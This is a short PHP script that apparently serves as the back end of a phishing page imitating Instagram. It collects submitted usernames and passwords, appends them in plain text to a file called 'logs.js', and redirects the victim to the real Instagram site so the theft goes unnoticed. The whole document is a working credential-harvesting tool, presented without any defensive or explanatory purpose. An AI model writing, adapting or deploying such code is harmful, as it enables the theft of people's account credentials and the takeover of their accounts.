<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Log the credentials to a file
    $log = "Username: $username | Password: $password" . PHP_EOL;
    file_put_contents('logs.js', $log, FILE_APPEND | LOCK_EX);

    // Redirect to a fake success page or Instagram
    header('Location: https://www.instagram.com');
    exit();
} else {
    echo "Invalid Request";
}
?>
